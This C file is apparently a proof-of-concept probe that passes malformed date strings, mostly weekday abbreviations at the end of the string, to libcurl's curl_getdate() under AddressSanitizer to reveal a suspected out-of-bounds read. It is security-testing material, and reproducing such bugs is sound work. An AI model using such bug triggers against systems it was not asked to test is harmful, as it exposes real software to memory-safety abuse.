/***************************************************************************
 *                                  _   _ ____  _
 *  Project                     ___| | | |  _ \| |
 *                             / __| | | | |_) | |
 *                            | (__| |_|  _ <| |___
 *                             \___|\___/|_| \_\_____|
 *
 * PoC probe: drive the public curl_getdate() API with attacker-controlled
 * date strings (as received in HTTP Date:/Last-Modified:/Expires: headers).
 *
 * A date string the parser cannot make sense of is in-contract input: the
 * documented behavior is to return -1. Short weekday abbreviations placed
 * at the very end of the string are such input.
 *
 * Each string is placed in its own exactly-sized heap allocation so an
 * out-of-bounds read past the string terminator is caught by ASan.
 *
 * Build: cc -fsanitize=address -I<curl-prefix>/include probe.c \
 *            -L<curl-prefix>/lib -lcurl -o probe
 */
#include <curl/curl.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
  static const char * const dates[] = {
    "sa",                  /* short weekday at end of string */
    "mo",
    "tu",
    "we",
    "th",
    "fr",
    "su",
    "5 May sa",            /* same, within a longer date */
    "Sun, 06 Nov 1994 08:49:37 GMT",   /* sanity: normal date */
    NULL
  };
  int i;

  for(i = 0; dates[i]; i++) {
    size_t len = strlen(dates[i]);
    char *date = malloc(len + 1);
    if(!date)
      return 1;
    memcpy(date, dates[i], len + 1);
    /* documented to return -1 for strings it cannot parse */
    (void)curl_getdate(date, NULL);
    free(date);
  }
  return 0;
}
